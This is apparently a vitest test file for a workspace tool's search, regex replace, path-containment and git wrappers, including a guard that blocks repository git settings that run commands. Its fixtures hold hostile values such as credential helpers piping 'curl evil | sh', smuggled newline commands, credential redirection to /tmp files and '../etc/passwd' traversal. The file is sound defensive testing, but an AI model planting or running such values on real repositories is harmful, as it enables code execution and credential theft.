import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { git, parseRepos, parseStatus, reposCommand, UNSAFE_CONFIG_EXIT, unsafeSetting } from '../../src/workspace/git.js';
import { asEre, insideRoot, parseSearch, replaceAll, searchCommand } from '../../src/workspace/search.js';

describe('search on a host without ripgrep (review 2026-10-24)', () => {
  it('reads a regular expression as Replace reads it: \\d and (?:) work with grep too', () => {
    const dir = mkdtempSync(join(tmpdir(), 'burrow-grep-'));
    try {
      mkdirSync(join(dir, 'sub'));
      writeFileSync(join(dir, 'a.txt'), 'port 8080\nname web\n');
      writeFileSync(join(dir, 'sub', 'b.txt'), 'no digits here\nversion 2\n');
      // No rg on this PATH: grep answers.
      const run = (q: string) => parseSearch(execFileSync('sh', ['-c', searchCommand(dir, q, true, true)], { encoding: 'utf8', env: { PATH: '/usr/bin:/bin' } }));
      const r = run('(?:port|version) \\d+');
      expect(r.tool).toBe('grep');
      expect(r.matches.map((m) => `${m.path}:${m.line}`).sort()).toEqual(['a.txt:1', 'sub/b.txt:2']);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('a folder that cannot be entered fails with 3, under bash too: its 1 was "nothing found" (audit 2026-11-05)', () => {
    for (const shell of ['sh', 'bash']) {
      const r = spawnSync(shell, ['-c', searchCommand('/nonexistent-burrow-dir', 'needle', false, true)], { encoding: 'utf8' });
      expect(r.status).toBe(3);
    }
  });

  it('a grep without Perl expressions gets \\d as [0-9], also in a class, never an escaped backslash', () => {
    expect(asEre('\\d+')).toBe('[0-9]+');
    expect(asEre('[\\d,]')).toBe('[0-9,]');
    expect(asEre('\\D')).toBe('[^0-9]');
    expect(asEre('\\\\d')).toBe('\\\\d');
    expect(asEre('a\\.b')).toBe('a\\.b');
  });
});

describe('search output', () => {
  it('reads grep -rn when the host has no ripgrep', () => {
    const r = parseSearch('@@grep\n./a.txt:3:one needle\n./sub/b c.txt:10:x:y:z\n');
    expect(r).toEqual({
      tool: 'grep',
      truncated: false,
      matches: [
        { path: 'a.txt', line: 3, col: 1, text: 'one needle' },
        { path: 'sub/b c.txt', line: 10, col: 1, text: 'x:y:z' },
      ],
    });
  });

  it('a file with more matches than ripgrep lists per file, or output cut at its size limit: said to be incomplete (AUDIT2 FS-18)', () => {
    const lines = Array.from({ length: 200 }, (_, i) => JSON.stringify({ type: 'match', data: { path: { text: './big.txt' }, lines: { text: 'needle\n' }, line_number: i + 1, submatches: [{ start: 0 }] } }));
    expect(parseSearch(`@@rg\n${lines.join('\n')}\n`).truncated).toBe(true);
    expect(parseSearch('@@grep\n./a.txt:3:one needle\n', true).truncated).toBe(true);
  });

  it('reads rg --json, with columns in characters', () => {
    const line = JSON.stringify({ type: 'match', data: { path: { text: './é.txt' }, lines: { text: 'héé needle\n' }, line_number: 2, submatches: [{ start: 6 }] } });
    expect(parseSearch(`@@rg\n{"type":"begin"}\n${line}\n`).matches).toEqual([{ path: 'é.txt', line: 2, col: 5, text: 'héé needle' }]);
  });
});

describe('replace', () => {
  it('replaces text literally, or by regex with groups', () => {
    expect(replaceAll('a.b a.b', 'a.b', false, true, 'x')).toEqual({ text: 'x x', count: 2 });
    expect(replaceAll('port 80, PORT 81', 'port (\\d+)', true, false, 'listen $1')).toEqual({ text: 'listen 80, listen 81', count: 2 });
    expect(replaceAll('a-b', '(?<x>a)', true, true, '[$1]')).toEqual({ text: '[a]-b', count: 1 });
  });

  it('matches line by line, as the search that listed the hits: ^ and $ at every line, never across a line end', () => {
    expect(replaceAll('# a\nb\n# c\n', '^#', true, true, '//')).toEqual({ text: '// a\nb\n// c\n', count: 2 });
    expect(replaceAll('x  \r\ny \n', ' +$', true, true, '')).toEqual({ text: 'x\r\ny\n', count: 2 });
    expect(replaceAll('a\n\nb', '\\s+', true, true, '_')).toEqual({ text: 'a\n\nb', count: 0 });
    expect(replaceAll('a b\nc  d', '\\s+', true, true, '_')).toEqual({ text: 'a_b\nc_d', count: 2 });
  });

  it('a pattern that backtracks for ever runs in linear time, and a replacement that grows too large is refused (AUDIT2 FS-16)', () => {
    const t0 = Date.now();
    expect(replaceAll(`${'a'.repeat(30_000)}b`, '(a+)+$', true, true, 'x').count).toBe(0);
    expect(Date.now() - t0).toBeLessThan(2000);
    expect(() => replaceAll('a'.repeat(100_000), 'a', false, true, 'x'.repeat(1000))).toThrow(/too large/);
    // The whole match too, as the editor's own search panel writes it.
    expect(replaceAll('ab', 'b', true, true, '<$&>')).toEqual({ text: 'a<b>', count: 1 });
  });

  it('keeps paths inside the workspace', () => {
    expect(insideRoot('/data', 'x/y.txt')).toBe('/data/x/y.txt');
    expect(insideRoot('/data', '../etc/passwd')).toBeNull();
    expect(insideRoot('/data', '/etc/passwd')).toBe('/data/etc/passwd');
  });
});

describe('git', () => {
  it('a branch with dots in its name, its upstream too (AUDIT2 FS-28)', () => {
    const st = parseStatus('\n@@status\n' + ['## release/1.2...origin/release/1.2 [behind 3]', ''].join('\0'));
    expect(st).toMatchObject({ branch: 'release/1.2', upstream: 'origin/release/1.2', behind: 3 });
    expect(parseStatus('\n@@status\n' + ['## No commits yet on v2.0', ''].join('\0')).branch).toBe('v2.0');
  });

  it('names a file by its name, never as a pattern (AUDIT2 FS-07)', () => {
    expect(git('/srv', ['add', '--', '*.txt'])).toContain('--literal-pathspecs');
  });

  it('parses branch, upstream, renames and paths below the repository top', () => {
    const out = 'srv/\n@@status\n' + ['## main...origin/main [ahead 2, behind 1]', 'M  srv/a.txt', 'R  srv/new.txt', 'srv/old.txt', '?? srv/n.txt', ''].join('\0');
    expect(parseStatus(out)).toEqual({
      repo: true,
      branch: 'main',
      upstream: 'origin/main',
      ahead: 2,
      behind: 1,
      files: [
        { path: 'a.txt', index: 'M', worktree: ' ' },
        // The old name kept: unstaging takes both back (AUDIT2 FS-06).
        { path: 'new.txt', index: 'R', worktree: ' ', oldPath: 'old.txt' },
        { path: 'n.txt', index: '?', worktree: '?' },
      ],
    });
  });

  it('quotes messages and passes an identity', () => {
    expect(git('/data', ['commit', '-m', "it's done"], { name: 'A B', email: 'a@b.c' })).toContain(
      `git --literal-pathspecs -C /data -c core.fsmonitor=false -c core.hooksPath=/dev/null -c protocol.ext.allow=never -c submodule.recurse=false -c fetch.recurseSubmodules=false -c push.recurseSubmodules=no -c 'user.name=A B' -c user.email=a@b.c commit -m 'it'\\''s done'`,
    );
  });
});

describe("a repository's own settings that run a command (A3-SRV-04)", () => {
  // A stand-in git: the repository's config as `git config --list` (or -z) prints it, and every
  // other call written down, as if git ran.
  const GIT = `#!/bin/sh
case "$*" in
  *"config --local"*) case "$*" in *" -z"*) cat "$CFG.z" ;; *) cat "$CFG.list" ;; esac ;;
  *"config --worktree"*) ;;
  *) echo "$*" >> "$CFG.ran" ;;
esac
exit 0
`;
  const pull = (entries: [string, string][]) => {
    const dir = mkdtempSync(join(tmpdir(), 'burrow-guard-'));
    try {
      mkdirSync(join(dir, 'bin'));
      writeFileSync(join(dir, 'bin', 'git'), GIT);
      chmodSync(join(dir, 'bin', 'git'), 0o755);
      const cfg = join(dir, 'cfg');
      writeFileSync(`${cfg}.z`, entries.map(([k, v]) => `${k}\n${v}\0`).join(''));
      writeFileSync(`${cfg}.list`, entries.map(([k, v]) => `${k}=${v}\n`).join(''));
      const r = spawnSync('sh', ['-c', git(join(dir, 'repo'), ['pull', '--ff-only'])], { encoding: 'utf8', env: { PATH: `${join(dir, 'bin')}:/usr/bin:/bin`, CFG: cfg } });
      return { setting: unsafeSetting(r.status, r.stderr), ran: existsSync(`${cfg}.ran`) ? readFileSync(`${cfg}.ran`, 'utf8') : '' };
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };

  it('a credential helper is a command for the shell, whatever it starts with (audit 2026-11-05)', () => {
    for (const [k, v] of [
      ['credential.helper', '!id > /tmp/burrow-ran'],
      ['credential.helper', 'x; curl evil | sh #'],
      ['credential.https://example.com.helper', 'osxkeychain && id'],
      // A value with a newline is two commands; `--list` printed the second on a line of its own.
      ['credential.helper', 'store\nid > /tmp/burrow-ran'],
      // Credentials handed to a file or a daemon of someone else's.
      ['credential.helper', 'store --file=/tmp/creds'],
      ['credential.helper', 'cache --socket=/tmp/sock'],
    ] as [string, string][]) {
      const r = pull([['user.name', 'x'], [k, v]]);
      expect(r.setting, v).toBe(k);
      expect(r.ran, v).toBe('');
    }
  });

  it("an ssh key command for signing runs too (gpg.ssh.defaultKeyCommand, audit 2026-11-05)", () => {
    expect(pull([['gpg.ssh.defaultkeycommand', 'id > /tmp/burrow-ran']]).setting).toBe('gpg.ssh.defaultkeycommand');
  });

  it("git's own helpers by name, an emptied list and harmless settings pass", () => {
    for (const entries of [[], [['credential.helper', '']], [['credential.helper', 'store']], [['credential.https://example.com.helper', 'cache --timeout=3600']], [['user.name', 'a; b'], ['core.hookspath', '.husky']]] as [string, string][][]) {
      const r = pull(entries);
      expect(r.setting, JSON.stringify(entries)).toBeNull();
      expect(r.ran, JSON.stringify(entries)).toMatch(/pull --ff-only/);
    }
    expect(UNSAFE_CONFIG_EXIT).toBe(97);
  });

  it("never a submodule's own settings: git does not go into submodules (audit 2026-11-05)", () => {
    const cmd = git('/srv/app', ['pull', '--ff-only']);
    for (const c of ['submodule.recurse=false', 'fetch.recurseSubmodules=false', 'push.recurseSubmodules=no']) expect(cmd).toContain(`-c ${c} `);
  });
});

describe('repositories below a workspace folder (report 91e73c)', () => {
  it('found a few levels down, never inside node_modules, the folder itself not among them', async () => {
    const { mkdtempSync, mkdirSync, rmSync } = await import('node:fs');
    const { tmpdir } = await import('node:os');
    const { join } = await import('node:path');
    const { spawnSync } = await import('node:child_process');
    const root = mkdtempSync(join(tmpdir(), 'burrow-repos-'));
    try {
      for (const d of ['.git', 'svc-a/.git', 'libs/svc-b/.git', 'node_modules/x/.git', 'a/b/c/d/deep/.git', "it's/.git"]) mkdirSync(join(root, d), { recursive: true });
      const out = spawnSync('sh', ['-c', reposCommand(root)], { encoding: 'utf8' }).stdout;
      expect(parseRepos(out, root)).toEqual([`${root}/it's`, `${root}/libs/svc-b`, `${root}/svc-a`]);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});
